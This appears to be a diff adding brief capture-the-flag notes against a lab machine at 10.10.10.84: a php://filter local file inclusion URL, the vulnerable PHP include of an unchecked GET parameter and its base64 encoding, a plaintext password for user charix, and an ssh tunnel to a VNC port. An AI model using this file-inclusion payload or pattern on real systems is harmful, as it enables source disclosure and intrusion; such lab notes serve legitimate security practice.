@@ -1,0 +1,11 @@
+http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=browse.php
+
+<?php
+include($_GET['file']);
+?>
+
+PD9waHAKaW5jbHVkZSgkX0dFVFsnZmlsZSddKTsKPz4K
+
+Charix!2#4%6&8(0
+
+ssh -g -L 6666:localhost:5901 charix@10.10.10.84
